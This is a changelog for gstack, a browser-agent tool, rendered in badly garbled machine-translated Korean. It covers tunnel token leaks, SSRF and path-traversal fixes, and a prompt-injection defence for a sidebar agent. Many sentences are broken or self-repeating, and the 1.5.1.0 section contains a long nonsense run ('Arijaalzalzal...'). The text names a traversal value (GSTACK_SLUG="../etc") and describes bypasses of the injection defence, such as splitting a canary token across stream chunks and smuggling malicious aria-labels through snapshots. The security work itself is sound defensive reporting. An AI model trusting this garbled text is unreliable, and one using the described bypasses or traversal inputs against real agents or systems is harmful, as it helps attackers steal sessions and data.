`pair-agent --client`는 gstack의 가장 좋은 온보딩 순간입니다. 하나의 명령, 공유 가능한 URL, 원격 에이전트가 브라우저를 구동하는 것입니다. 또한, `Origin: chrome-extension://` spoof에 루트 브라우저 토큰을 넣은 public 엔드포인트를 방송하는 순간이었습니다. @garagon은 PR #1026에서 `tunnelActive` 으로 재 서핑을 합니다. DM 는 `tunnelActive` 의 패치를 처음에 발송했습니다. DM 는 `tunnelActive` 의 패치를 DM 으로 발송했습니다. Codex는 `/plan-ceo-review`가 브리틀에 접근하고, 건축 수정에 정진된 사용자의 음성입니다: 물리적 포트 분리. 이 릴리스가 무엇인지입니다.

`pair-agent --client`를 실행할 때 daemon는 TWO HTTP 청취자를 묶습니다. 로컬 포트(bootstrap, CLI, sidebar, cookie-picker, inspector)는 127.0.0.1에 머물며 결코 전달되지 않습니다. 터널 포트는 `/connect` (방수식, 미정 + 속도 제한) 및 브라우저-드라이브 명령의 allowlist만 전달합니다. ngrok는 포트만 전달합니다. ngrok URL에 흠뻑 취하는 콜러는 `/health`, `/cookie-picker`, `/inspector/*`, 또는 `/welcome`에 도달할 수 없습니다 - 서버가 부트 스트랩 포트에 도착하지 않기 때문에, HTTP 요청이 실패하기 때문에. 터널 토큰은 403을 클리어 페어링 힌트로 보내지게 됩니다.

파는 또한 3 다른 CVE 클래스 Codex 표면. `/activity/stream` 및 `/inspector/events`는 `?token=` 쿼리 파라ms (URLs 누출 로그, 참조, 역사)에 대한 루트 token를 허용하도록 사용. 이제 그들은 별도의 뷰 전용을 가지고 30 분 HttpOnly SameSite=Strict cookie 이는 NOT 유효 `/command`. `/welcome`. `/welcome` .. `/welcome` . `/connect` 비율 제한은 3/min 세계적으로, DOS는 어떤 합법적인 쌍 에이전트 구호든지인. 설치 열쇠가 24 임의 바이트이기 때문에 300/min에 loosened. 한계는 홍수 방위를 위해, 중요한 추측하지 않습니다. Windows에 쿠키 항구는 추적 문제점 (#1136)를 가진 v20 ABE 고도 경로로 문서화됩니다.

### 중요 한 숫자

| Surface | 의 전 | 후지후 |
|---|---|---|
| 터널에 `/health` | root token를 모든 크롬 확장 origin로 반환합니다. | 제한 (404, 잘못된 포트) |
| 터널에 `/cookie-picker` | HTML는 루트 token를 포함 | 제한 (404, 잘못된 포트) |
| 터널에 `/inspector/*` | Bearer와 일치할 수 있는 | 제한 (404, 잘못된 포트) |
| 터널 위에 `/command`, 루트 token | executes | 403 쌍 힌트 |
| `/command` 터널에, scoped token | 어떤 명령 | allowlist: 17개의 브라우저-드라이브 명령만 |
| `/activity/stream` auth | `?token=<ROOT>` URL | HttpOnly `gstack_sse` cookie, 30 분 TTL, 스트림스코프만 |
| `/inspector/events` auth | `?token=<ROOT>` URL | cookie /activity/stream와 동일하게 cookie |
| `/connect` 비율 제한 | 3/min (블록된 다리) | 300/min (flood-only, no 쌍) |
| `/welcome` 경로 트래버스 | `GSTACK_SLUG="../etc"` 인터폴레이트 | regex `^[a-z0-9_-]+$`, 내장 된 가을 |
| 터널 오덴탈로그 | none | async JSONL to `~/.gstack/security/attempts.jsonl`, rate-capped 60/min |
| Windows v20 ABE CDP를 통해 | 의논문 | #1136로 추적된 비고, |

| 층별 검색 | Command | Outcome |
|---|---|---|
| `/plan-ceo-review` (Claude) | SELECTIVE EXPANSION | 7 제안, 7 허용, 확장 사이드바 부츠 스트랩에 긴요한 격차 |
| `/codex` (밖에 음성) | 14개의 발견 | 계획 고정의 사실 오류, 4 하위 계층 긴장 해결, 2 새로운 CVE 클래스 추가 |
| `/plan-eng-review` (Claude) | 5개의 아카이브 결정 잠금 | 터널 수명주기, token scoping, PR #1026 취급, SSE cookie 디자인, 노선 allowlist |

### 쌍 에이전트을 실행하는 누군가를 위한 이 방법

노트북에서 `pair-agent --client test-agent`를 실행하십시오. ngrok URL를 누군가와 공유하십시오. 그들의 에이전트은 당신의 브라우저를 모읍니다. 당신의 sidebar는 당신이 하는 무슨을 보여주기 위하여 당신을 지킵니다. 그 ngrok URL에 떨어뜨리는 낯선 사람은 `/connect`를 제외하고, 그리고 `/connect`를 제외한 모든 것에 404를 얻습니다. 당신이 변화하는 명령에 관하여 아무것도.

### 항목화 된 변경

#### 추가

- **듀얼-리스트제 HTTP 건축.** 터널가 활성화될 때, daemon는 에페레아랄 127.0.0.1 항구에 전용 청취를 묶고 `ngrok.forward()`를 그 위에 놓습니다. `/tunnel/start` 게으른 빈드s 청취자; `/tunnel/stop`는 그것을 아래로 찢습니다. 바인드 오류에 단단한 파밀은, 결코 국부적으로 항구에 뒤떨어지지 않습니다. `BROWSE_TUNNEL=1` 시작은 동일한 본을 따릅니다. `browse/src/server.ts` ~320 선.
- **터널 지상 여과기.** 각 노선 파견 전에 실행합니다. 404s 경로는 `TUNNEL_PATHS` (`/connect`, `/command`, `/sidebar-chat`)에 아닙니다. 403s는 명확한 힌트를 가진 루트 Bearer token를 나르는 어떤 요구든지. scoped 토큰 없는 401s 비/connect 요구. 각 종말은 `~/.gstack/security/attempts.jsonl`에 기록합니다.
- **터널 명령의 수당.** `/command` on the tunnel surface enforces `TUNNEL_COMMANDS` (17 browser-driving commands: `goto`, `click`, `text`, `screenshot`, `html`, `links`, `forms`, `accessibility`, `attrs`, `media`, `data`, `scroll`, `press`, `type`, `select`, `wait`, `eval`). Remote paired agents cannot launch new browsers, configure the daemon, or touch the inspector.
- **SSE 세션 쿠키만 볼 수 있습니다.** `POST /sse-session` mint endpoint와 새로운 `browse/src/sse-session-cookie.ts` 레지스트리. 256 비트 토큰, 30 분 TTL, HttpOnly + SameSite=Strict. 모듈 경계 수준 (모듈은 `token-registry.ts`)에서 메인 token 레지스트리에서 범위 격리. 적용된 학습: `cookie-picker-auth-isolation`, 10/10의 신뢰.
- **터널 오즈 덴탈 로그.** `browse/src/tunnel-denial-log.ts`, 60/min 비율 모자 in-process를 가진 async `fs.promises.appendFile`. 적용된 앞에: `sync-audit-log-io`, 10/10의 신뢰.
- **E2E 페어링 테스트.** `browse/test/pair-agent-e2e.test.ts`, 12 daemon (BROWSE_HEADLESS_SKIP=1)에 대한 행동 테스트. `/pair` → `/connect` → scoped token → `/command` 교류, `?token=` 쿼리 파라미드 거부, `/sse-session` cookie 플래그를 검증합니다. ~220ms, no 네트워크.
- **ARCHITECTURE.md 이중 감적 계약.** Per-endpoint 분해 테이블 (현지 vs 터널), 터널 덴탈 로그 모델, SSE cookie 범위, N2 비고문 문서.

#### 변경

- **SSE 엔드포인트 no는 URL에서 `?token=`를 더 오래 받아들입니다.** `/activity/stream`와 `/inspector/events`는 Bearer 또는 `gstack_sse` 쿠키를 가지고 있습니다. 연장 (`extension/sidepanel.js`)는 `POST /sse-session`를 통해 부트 스트랩에서 cookie를 한 번 끌어 놓고 `EventSource`를 `withCredentials: true`로 엽니다. URL는 비밀을 결코 운반하지 않습니다.
- **`/connect` 비율 제한은 3/min에서 300/min에 느슨하게 했습니다.** 설정 키는 24 임의 바이트입니다. 3/min는 이름의 brute-force 방어이며 실제 쌍 실패를 발생했습니다. 300/min는 합법적인 사용으로 방아쇠없이 홍수를 처리합니다.
- **`/welcome` GSTACK_SLUG `^[a-z0-9_-]+$`에 문지어진.** 오늘 악용이 아닌 길에 대한 방어적인 심층적이지만, 삼관적으로 mitigable.
- **`/pair`와 `/tunnel/start` probe `GET /connect`를 통해 캐쉬드 터널은 `/health`를 통해서, 아닙니다.** `/health`는 no 더 긴 이중 명부작성 디자인의 밑에 터널 표면에 도달하.
- **`cookie-import-browser.ts` 댓글 수정.** 이전 주장 "no 기본보다 악화, v20 App-Bound Encryption과 CDP 포트 IS 고도 경로에 잘못된. `--remote-debugging-pipe` 후속에 대한 추적 문제로 문서화.

#### 고정

- **다운로드 + 스크랩을 통해 SSRF.** `page.request.fetch`는 `browse/src/write-commands.ts`에서 호출합니다. `validateNavigationUrl`를 통해 막습니다. 구름 메타데이터 엔드포인트 (AWS IMDSv1, GCP, Azure), RFC1918 범위, `file://`를 차단합니다. @garagon에 의해 PR #1029에서 토론하십시오.
- **봉투 sentinel 탈출에서 scoped 스냅 샷.** `browse/src/snapshot.ts`와 `browse/src/content-security.ts`는 `escapeEnvelopeSentinels()`를 공유합니다. 리터럴 봉투 delimiter를 포함하는 페이지 내용은 no를 더 긴 위조할 수 있습니다 LLM의 틀에 위탁하는 가짜 "신탁한"를 붙입니다. @garagon에 의하여 PR #1031에서 토론하십시오.
- **모든 DOM-reading 채널을 통해 숨겨진 요소 탐지.** 이전 `command === 'text'` ran `markHiddenElements`. 이제 DOM 채널 (`html`, `links`, `forms`, `accessibility`, `attrs`, `media`, `data`, `ux-audit`) 표면은 봉투에 있는 숨겨지은 내용 경고를 표시합니다. @garagon에 의하여 PR #1032에서 설명했습니다.
- **`--from-file` 유료로드 경로 검증.** `load-html --from-file`와 `pdf --from-file`는 `validateReadPath`를 직접 API 경로로 파란스를 위한 페이로드 경로에 실행합니다. CLI/API `SAFE_DIRECTORIES`를 위해 해치를 탈출합니다. PR #1103에서 @garagon로 구부리십시오.
- **`design/src/serve.ts` `JSON.stringify`를 통해 `url.origin`를 곱했습니다.** origin 값을 HTML로 변환합니다. @theqazi (PR #1073 부분)에 의해 기여했습니다.
- **`scripts/slop-diff.ts` 좁은 `shell: true` 으로 Windows 으로만.** POSIX에 포탄 해석 표면을 폭 넓은 없이 플랫폼 별 필요를 일치합니다. @theqazi (PR #1073 부분)에 의해 공헌하는.

#### 기여자

- F1 (dual-listener refactor)는 branch에 4개의 투입으로 비스듬히 비스듬히 묶습니다: 비율 한계 풀기, 새로운 `tunnel-denial-log` 단위, server.ts 재공장, 그리고 새로운 근원 수준 시험 스위트. 각 commit는 자주적으로 녹색입니다. 초래된 파 품목 rebase에 F1는 청결하게 합니다.
- Credits: @garagon (critical bug surface in PR #1026 plus SSRF, envelope, DOM-channel coverage, and --from-file PRs), @Hybirdss (PR #1002 concept, superseded by F1 but informed the policy model), @HMAKT99 (PRs #469 and #472 — both ended up already-landed-on-main; credit for surfacing the issues), @theqazi (2 commits from #1073, skills portion deferred pending internal voice review per CLAUDE.md).
- `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-security-wave-v1.5.2.md`에 저장된 코덱 검토 계획. `~/.gstack/projects/garrytan-gstack/garrytan-garrytan-sec-wave-eng-review-test-plan-*.md`의 엔리뷰 테스트 플랜.
- #1136: TCP에서 `--remote-debugging-pipe`에 수송하는 쿠키 항구browser CDP를 `--remote-debugging-port`로 추적하는 비 고랄은 이렇게 Windows v20 ABE 고도 경로가 닫힙니다. 비 트리 바이알 (Playwright는 관 수송을 노출하지 않습니다; 최소한 CDP 오버 파이프 클라이언트를 필요로 합니다); 이 파에서 의도적으로 녹습니다.

## [1.5.1.0] - 2026-04-20

## **v1.4.0.0 /make-pdf의 세 가지 가시 버그, 모든 고정.**

페이지 발기는 Chromium의 기본 발기자 및 우리의 인쇄 CSS가 둘 다 연출 수 있기 때문에 각 페이지에 "6"의 8"의 두번 보여주었습니다. `&`가 `<title>`와 TOC 항목에 `Faber &amp;amp; Faber`로 렌더링되는 표다운 제목은 추출자가 태그를 벗겨지기 때문에, 엔비티를 해독합니다. Linux (Docker, CI, 서버) CI, Arijaalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalzalz 이 릴리스는 모든 세를 수정하고 각 시간의 명백한 증상을 넘어 수정을 확장합니다.

### 중요 한 숫자

모든 세 가지 버그가 붙잡고 모든 코드가 작성되기 전에 검토에서 확장되었습니다. 계획은 `/plan-eng-review` (Claude)를 통해 갔다, 그 다음 `/codex` (outside voice), 그 후 구현. 소스 : `.github/docker/Dockerfile.ci` (Linux 글꼴), `make-pdf/test/render.test.ts` (17 새로운 테스트), `git log main..HEAD` (이 branch).

| Surface | 전 (v1.4.0.0) | (v1.5.1.0) 이후 |
|---------|-------------------|-----------------|
| 페이지 발러 | "8"의 6은 두 번 겹쳐 쌓였습니다. | "6 의 8" 한 번 |
| `# Faber & Faber` `<title>` | `Faber &amp;amp; Faber` | `Faber &amp; Faber` |
| TOC `&`와 함께 입력 | 더블캡 | 단일 캡슐화 |
| `&#169;` (copyright) H1 | Broken | `©`에 디코딩 |
| `--no-page-numbers` CLI 플래그 | 진정한 아무것도하지 않았다 | 실제 페이지 번호를 억제 |
| `--footer-template` | 레이어 CSS 상단의 페이지 번호 | 사용자 정의 발기, 깨끗하게 승리 |
| Linux PDF 몸 글꼴 | DejaVu 산 (잘못된) | 리비아 산 (metric-compatible Helvetica clone) |

| 층별 검색 | 의논하기 | Outcome |
|--------------|----------|---------|
| `/plan-eng-review` (Claude) | 1 건축 간격 | 확장 버그 1 범위는 CSS-side conditional을 포함 |
| `/codex` (밖에 음성) | 11개의 발견 | 11 통합 (데이터 흐름, TOC 사이트, 디코더 충돌, 발터 하수인, 테스트 계약, 범위 경계, 글꼴 의존성) |
| Cross-model 계약률 | ~30% | Codex 7문제 Claude's eng review 너무 고위험에 의해 놓여 |

계약 속도는 말한다. 하나의 검토자는이 디프에 충분하지 않았다. Codex는 버그 1에 대한 내 원래 "하나 라인 수정"이 왼쪽되었다는 것을 잡았다 `--no-page-numbers` CLI 플래그가 조용히 죽은, 때문에 `RenderOptions` `pageNumbers`와 관현관의 `render()` 전화가 그것을 통과하지 않았다. 두 번째 의견없이, CLI 플래그는 다시 끊어졌다.

### PDF 생성을 하는 사람에 대 한이 의미

페이지 번호는 CLI에서 CSS로 한 플래그로, custom-footer semantic restored로 제어됩니다. 제목, 커버 페이지, TOC 항목 렌더링 HTML entities는 `&#169;`와 같은 숫자 엔티티티를 포함하여 정확하게 렌더링합니다. Linux 환경 no는 글꼴 표현에 대해 더 이상 알아야합니다. Dockerfile은 명시적으로 빌드 타임 `fc-match` 런닝을 설치합니다. 이제는 Mac/> 출력이 실패한 경우, Mac/np/>의 출력이 사라집니다.

### 항목화 된 변경

#### 고정

- **페이지 번호 no 더 긴 각 페이지에 두 번 렌더링.** Chromium의 `@page @bottom-center` CSS의 정상에 층에 사용된 본래 발자국. 이제 CSS는 진실의 단 하나 근원입니다; Chromium 본래 번호가 불조건으로 떨어져 있습니다.
- **`--no-page-numbers`는 끝을 작동합니다.** CLI 플래그는 CSS 레이어를 `RenderOptions.pageNumbers`로 옮깁니다. 이전으로는 오케스트라와 CSS에 사망하여 숫자를 묶습니다.
- **`--footer-template`는 청소하게 재고 발병기를 대체합니다.** 사용자 정의 발기부를 통과 이제 CSS 페이지 번호를 억제, 원래 "custom footer wins" semantic을 보존하여 버그 1이 콜라보로 움직여.
- **HTML 제목, 커버 페이지 및 TOC 항목에 대한 엔티티티티가 올바르게 렌더링됩니다.** A markdown heading like `# Faber & Faber` renders as `Faber &amp; Faber` in `<title>` (single-escaped) instead of `Faber &amp;amp; Faber` (double-escaped). Covers both extractor call sites: `extractFirstHeading` (title + cover) and `extractHeadings` (TOC).
- **숫자 HTML entities도 디코드입니다.** `&#169;` H1에서 `©`로 이제 PDF 제목으로 렌더링합니다. 십이지수와 육수는 모두 지원됩니다.
- **Linux PDF는 DejaVu Sans 대신 리버스 산에서 렌더링합니다.** 모든 4개의 인쇄에 있는 글꼴 더미-CSS 구멍 (몸, 운영하는 우두머리, 페이지 수, CONFIDENTIAL 상표)는 지금 Helvetica와 Arial 사이 `"Liberation Sans"`를 포함합니다. 미터 호환이 되는, SIL OFL 1.1는, `fonts-liberation`를 통해 설치합니다.

#### 변경

- `.github/docker/Dockerfile.ci`는 `fonts-liberation` + `fontconfig`를 retries로 명시적으로 설치하고 `fc-cache -f`를 실행하고, 마지막 빌드 단계에서 `fc-match "Liberation Sans"`를 정의합니다. 이전으로 Playwright의 `install-deps`에 의존하여, 자동으로 업그레이드에 진입할 수 있습니다.
- `SKILL.md.tmpl` 문서 Linux CI/Docker 외부 설치 사용자에 대한 글꼴 의존성.

#### 기여자

- `render.ts` (`decodeTypographicEntities`에서 `&amp;`를, 의도적으로 HTML에서 `&amp;`를 `&amp;amp;`가 합법적으로 될 수 있는) 파이프라인 HTML에서 `&amp;`를 보존하는 기존 `decodeTypographicEntities`에서 중단하는 새로운 것을 사용하십시오. `<title>`, 덮개, 또는 TOC를 위해 destined를 추출할 때 새로운 것을 사용하십시오.
- `PrintCssOptions.pageNumbers`는 기존 `showConfidential` 패턴과 일치하는 조건에서 `@bottom-center` 규칙을 감싸고 있습니다. `RenderOptions`를 통해 `orchestrator.ts`를 통해 `render()` 전화 사이트 (generate + 미리보기)로 전달합니다.
- `make-pdf/test/render.test.ts`: `printCss` 페이지Numbers isolation (3), `render()` data flow with footerTemplate (4), `&`, `<`, `>`, `©`, `—` (5), `<title>` 정확한 단일 지진 assertion, TOC 단일 거리, 숫자성 디코드, smartypants-interacteration, Sanpagesss, www.`—`, `<title>`, `<title>`, TOC, TOC, 단일 거리, 숫자성공, smartypants-interacteration, www.
- 알려진 테스트 갭 (작은, 미래 PR): 육수성 경로, 이중 인코딩 입력, SKILL.md Linux 주 내용 assertion와 함께 amp-last 주문. 오케스트라터 → `browseClient.pdf({pageNumbers: false})` 및 오케스트라 → `render()` 운송은 CSS 종료 테스트, 직접 asserted하지 않고도 전적으로 적용된다.

## [1.5.0.0] - 2026-04-20

## **당신의 sidebar 에이전트은 지금 신속한 주입에 대하여 스스로 방어합니다.**

웹 페이지를 숨겨진 악의 지시로 열고 gstack의 사이드 바는 Claude가 올바른 일을 할 것이라고 신뢰하지 않습니다. 브라우저 스캔으로 번들 된 22MB ML 클래스터는 모든 페이지를로드, 모든 도구 출력, 당신이 보내는 모든 메시지. 그것은 신속한 주사 공격과 같은 것처럼 보이는 경우, 세션은 Claude가 위험한 작업을 수행하기 전에 중지합니다. 시스템의 비밀 운하 token 프롬프트 캐치에서 세션을 엑필하려고 시도, 그 token가 어디에서나 Claude의 출력, 도구 인수, URL, 또는 파일 쓰기, 세션 종료 및 당신은 정확히 어떤 신뢰도에 레이어를 불을 덮는. 서스템은 로컬 로그에 가서, 선택적으로 지역 사회 telemetry를 집계하기 위해 그래서 모든 gstack 사용자는 방어 개선을위한 센서가된다.

### 당신을 위한 어떤 변화

Chrome 사이드바를 열고 오른쪽 상단의 작은 `SEC` 배지를 볼 수 있습니다. 녹색은 전체 방어 스택이로드됩니다. 호박은 무언가를 의미 (일부 사용, 약 30s). 빨간색은 보안 모듈 자체가 충돌하고 당신은 건축 컨트롤 만 실행됩니다. 층별 세부 사항에 대한 Hover.

공격 화재가 발생하면 중앙 경고 - 무거운 배너가 나타납니다. "Session는 {domain}에서 감지 된 신속한 주입입니다. "무엇이 일어났다"를 확장하고 정확한 클래스터 점수를 볼 수 있습니다. 한 번의 클릭으로 나머지. No mystery.

### 번호

| Metric | v1.4의 앞에 | v1.4 이후 |
|---|---|---|
| 방어 층 | 4 (content-security.ts) | **8** (ML 내용, ML 성적표, 수사, 베라딕트 합창단) |
| 운하에 덮인 공격 채널 | 0 | **5** (텍스트 스트림, 도구 args, URL, 파일 쓰기, 하위 프로세스 args) |
| 1인용 클래스터 비용 | none | **$0** (분간, 로컬 실행) |
| 모델 크기 배송 | 0 | **22MB(월)** (TestSavantAI BERT-small, int8에 의하여 냉각되는) |
| 선택적 ensemble 모델 | none | **721MB 디버타-v3** (`GSTACK_SECURITY_ENSEMBLE=deberta`를 통해 채택에서) |
| BLOCK 결정 규칙 | none | **2-of-2 ML 계약** (또는 ensemble을 가진 2of-3)는, 죽이는 회의에서 단 하나 종류 부정한 긍정적인 것을 막습니다 |
| 안전 표면의 시험 | 12 | **280** (25 기초 + 23 adversarial + 10 통합 + 9 분류기 + 7 Playwright + 3 벤치 + 6 bun-native + 15 소스 계약 + 11 adversarial-fix 회귀 + 다른 사람) |
| 공격적인 텔레메틱스 | 로컬 파일 만 | **community-pulse edge function + gstack-security-dashboard CLI** |

### 실제로 배는 무엇입니까

* **security.ts** - 캐러리 주입 플러스 체크, ensemble 규칙과 버락 결합자, 교체, 크로스 프로세스 세션 상태, 장치 기울은 페이로드 해싱과 공격 로그
* **security-classifier.ts** - TestSavantAI (default) 플러스 Claude 하이쿠 성적표 플러스 선택-인 DeBERTa-v3 앙상블, 모든 우아한 실패 열려있는
* **프리spawn이드 ML 스캔** 각 사용자 메시지에 플러스 도구 출력 스캔에 모든 읽기, Glob, Grep, WebFetch, Bash 결과
* **방패 아이콘** 3개 주 (녹색, 호박색, 빨강)을 가진 `/sidebar-chat` poll를 통해 지속적으로 새롭게 하는
* **수유 배너** (확장된 디자인 모조 당 중심적인 경고 heavy) 확장 가능한 층 핵심 세부사항
* **공격 telemetry** 기존 `gstack-telemetry-log`를 `community-pulse`로 Supabase 파이프 ( 계층화, 커뮤니티 업로드, 익명 local-only, 오프는 no-op)
* **`gstack-security-dashboard` CLI** - 지난 7일 동안 공격된 공격, 공격된 도메인, 층 분포, 베토딕스 분할
* **BrowseSafe-Bench 연기 마구** — Perplexity의 3,680-case adversarial dataset, 캐시된 hermetically의 신호 별거에 문에서 200의 케이스
* **라이브 Playwright 통합 테스트**는 L6 방어적인 계약을 통해 L1를 핀으로 꼿습니다
* **Bun-native 분류기 연구 skeleton** plus design doc — WordPiece tokenizer matching transformers.js output, benchmark harness, FFI roadmap for future 5ms native inference

## # 배를 맑게함

두 개의 독립적 인 adversarial 검토자 (Claude subagent 및 Codex/gpt-5.4) 4 개의 우회 경로에 통합. 모든 4는 merge 전에 고정 :

* **Canary 스트림 펑크 분할** - 연속 `text_delta` 및 `input_json_delta` 사건에 걸쳐 회전 버퍼 탐지. 너무 `.includes()` 랜 per-chunk, 그래서 공격자는 Claude를 요청할 수 있습니다. 두 개의 델타 시와 체크를 통해 캐러리 분할을 방출.
* **Snapshot 명령 우회** — `$B snapshot`는 ARIA-name 출력을 페이지에서 방출하지만 `PAGE_CONTENT_COMMANDS`에서 누락되었으므로, 신뢰할 반송 봉투없이 Claude로 흐르는 악의적 인 aria-labels가 다른 읽는 경로가 뜹니다.
* **도구 산출 단 하나 층 BLOCK** — `combineVerdict`는 `{ toolOutput: true }`를 받아들입니다. 도구 가늠자에 더미 과잉 FP 관심사는 적용하지 않습니다 (내용은 사용자 오존하지 않았습니다), 그래서 BLOCK 임계값에 단 하나 ML 분류기 지금 WARN에 분해 대신에 막습니다.
* **Transcript 클래스터 도구 출력 컨텍스트** - Haiku는 이전에 도구 가늠자 검사에 `user_message + tool_calls` (empty 입력)만, 단지 testavant_content가 신호를 얻었습니다. 이제 실제적인 도구 산출 원본을 받고 투표할 수 있습니다.

또한: `escapeHtml` (escapes `"`와 `'` now)에 있는 속성 주입 고침, `GSTACK_SECURITY_OFF=1`는 지금 `loadTestsavant`/`loadDeberta` (doc 약속 아닙니다)에 있는 진짜 문, 장치 소금에 절인 가공 이렇게 FS-unwritable 환경은 해시 correlation, 도구 사용 레지스트리 입장을 `tool_result` (memory/>)에 evicted, 유효한 땋는 것을 허용할 때, `tool_result` (memory/>)를 위해 유효한 땋는 것을 허용했습니다.

### Haiku 성적표 부록 (실린 버그 + 문 제거)

성적표 (`checkTranscript` 호출 `claude -p --model haiku`)는 죽은 배송되었다. 두 버그:

1. 모델 별명 `haiku-4-5`는 CLI에서 404를 반환했습니다. 정확한 간결은 `haiku` (현재 `claude-haiku-4-5-20251001`에, 모형 목록으로 최신 Haiku에 체재합니다)입니다.
2. 2초의 타임아웃은 바닥 아래였습니다. 신선한 `claude -p` spawn는 ~2-3s CLI 콜드 시작 + 5-12s inference on ~1KB 프롬프트가 있습니다. 2s에서 매번 호출됩니다. 15s로 옮겼습니다.

`shouldRunTranscriptCheck`는 `>= LOG_ONLY`에서 다른 층 발사에 Haiku를 문질러 갑니다. BrowseSafe-Bench의 ~85%에 L4 놓는 (TestSavantAI 호출은 브라우저 에이전트 특정한 공격에 ~15%입니다), Haiku는 결코 투표할 기회를 얻지 않았습니다. 우리는 우리의 약한에 우리의 제일 신호를 그라데이트하고 있었습니다. 도구 산출을 위해 이 문은 지금 제거됩니다 — L4 Lcku + Haiku는 항상 평행한에서 실행합니다.

검토-에-BLOCK UX (지용된 텍스트 excerpt + per-layer scores + Allow / Block session button) 토지와 함께 잘못된 긍정적 인 긍정적 인 세션킬링 대신 회복 할 수 있도록.

### 측정: BrowseSafe-Bench (200 케이스 연기)

상기 수정 후 200 건의 경우:

|  | L4-만 (베포) | Haiku (after)와 함께 움직여 |
|---|---|---|
| 검출 비율 | 15.3% | **67.3%** |
| False-positive 비율 | 11.8% | 44.1% |
| 런타임 | ~90년대 | ~41 분 (호쿠 긴 극) |

**탐지에 있는 4.4x 상승.** FP 비율은 또한 3.7x를 상승했습니다 - Haiku는 TestSavantAI 미소를 통해서 가장자리 케이스에 공격적이고 불입니다. 검토 기치는 그 FPs 회복할 수 있습니다: 사용자는 의심스러운 excerpt + 층 점수를, 누르십시오 한 번 허용하고, 회의는 계속합니다. P1 후속은 Haiku WARN 문턱을 달립니다 (현재 0.6는, 아마 실제 시도한 자료에 대하여 0.7-0.85).

정직한 선박 자세: 이것은 v1.3.x 보다는 의미있게 더 안전합니다, 방탄하지 않습니다. Canary (deterministic), 내용 보안 L1-L3 (structural), 검토 기치는 ML 층 놓거나 불을 때 짐 방위를 남아 있습니다.

### Env 손잡이

* `GSTACK_SECURITY_OFF=1` - 비상 사태 스위치 (현재는, ML 건너뛰기)
* `GSTACK_SECURITY_ENSEMBLE=deberta` — 2of-3 계약에 대한 721MB DeBERTa-v3 앙상블 클래스터 선택

### 기여자

Supabase 마이그레이션 `004_attack_telemetry.sql`는 `telemetry_events` (`security_url_domain`, `security_payload_hash`, `security_confidence`, `security_layer`, `security_verdict`)와 대쉬보드 집계를 위한 2개의 부분 색인을 추가합니다. `community-pulse` 가장자리 기능은 보안 단면도를 집계합니다. `cd supabase && ./verify-rls.sh`를 실행하고 당신의 정상 Supabase 배치 교류를 통해 배치하십시오.

---

## [1.4.0.0] - 2026-04-20

## **종료된 PDF로 모든 파일을 켭니다.**

새로운 `/make-pdf` 기술은 `.md` 파일을 가지고 간행물 PDF를 생성합니다. 1 인치 마진. Helvetica. 발기부에 있는 페이지 수. doc 제목을 가진 발판. 퀴논 인용, em dashes, ellipsis (...). 선택적인 덮개 페이지. 내용의 선택적인 누르기 테이블. 선택적인 대각선 DRAFT 워터 마크. PDF의 어떤 단락을 복사하고 그것을 붙여서 “nc”를 붙여서 “nc”를 붙여서 붙여넣기 위하여 붙여 넣기 위하여. 대부분의 markdown-to-PDF 도구 생성 출력은 스캐너를 통해 실행되는 법률 문서와 같은 출력을 세 번. 이 하나의 실제 에세이 또는 실제 편지처럼 읽습니다.

### 당신이 지금 할 수 있는 무슨

- `$P generate letter.md`는 감지 가능한 기본으로 PDF를 `/tmp/letter.pdf`로 깨끗한 문자 PDF를 작성합니다.
- `$P generate --cover --toc --author "Garry Tan" --title "On Horizons" essay.md essay.pdf` 왼쪽 정렬 커버 페이지를 추가합니다 (제목, 자막, 날짜, 헤어 라인 규칙) 그리고 H1/H2/H3 헤드링에서 TOC.
- `$P generate --watermark DRAFT memo.md draft.pdf`는 각 페이지에 대각선 DRAFT 워터마크를 오버레이합니다. 초안으로 보내십시오. 그것이 최종일 때 깃발을 떨어지십시오.
- `$P generate --no-chapter-breaks memo.md` default "every H1는 여러 개의 최상위 헤드를 가지고있는 memos에 대한 새로운 페이지"동작을 시작합니다.
- `$P generate --allow-network essay.md`는 외부 이미지 부하를 하자. default에 의해 떨어져 이렇게 누군가는 당신이 그들의 PDF를 생성할 때 추적 화소를 통해서 가정할 수 없습니다.
- `$P preview essay.md` 같은 HTML를 렌더링하고 브라우저에서 열립니다. 편집할 때 새로 고침합니다. PDF 라운드 여행을 준비할 때까지 기다리십시오.
- `$P setup`는 검색 + Chromium + pdftotext를 설치하고 종료 연기 시험을 실행합니다.

## 왜 텍스트가 실제로 깨끗하게 복사하는지

Headless Chromium는 비표준 미터 테이블을 가진 webfonts를 위한 per-glyph `Tj` 통신수를 방출합니다. 그것은 왜 다른 “markdown에 PDF” 도구 생성합니다 “저 l i g”로 “저장”를 “저장”를 켭니다 PDFs를입니다. 우리는 모든 것을 위한 체계 Helvetica로 발송합니다 ... Chromium는 그것에 대해 기본 미터가 있고 청결한 단어 수준 `Tj` 통신수를 방출합니다. CI 매트릭스는 결합 기능 정착물 (smartypants + hyphens + ligatures + bold/italic + 인라인 코드 + 목록 + blockquote + 챕터 브레이크, 모두)를 통해 `pdftotext` 추출한 텍스트 일치를 통해, 수액 예상된 파일. 어떤 특징이 추출을 깰 경우, 문 실패.

## # 두건 아래

make-pdf shells out to `browse` for Chromium lifecycle. No second Playwright install, no second 58MB binary, no second codesigning dance. `$B pdf` grew from "take a screenshot as A4" into a real PDF engine with `--format`/`--width`/`--height`, `--margins`, `--header-template`/`--footer-template`, `--page-numbers`, `--tagged`, `--outline`, `--toc`, `--tab-id`, and `--from-file` for large payloads (Windows argv caps). `$B load-html`와 `$B js`는 `--tab-id`도, 이렇게 평행한 `$P generate`는 활동적인 탭에 결코 경주하지 않습니다. `$B newtab --json`는 구조화된 산출을 돌려보내서 만듭니다-pdf는 regex-matching 로그 끈 없이 탭 ID를 몹니다.

### 기여자

- 기술 파일: `make-pdf/SKILL.md.tmpl`. 이진 소스: `make-pdf/src/`. 시험 정착물: `make-pdf/test/fixtures/`. CI 워크플로우: `.github/workflows/make-pdf-gate.yml`.
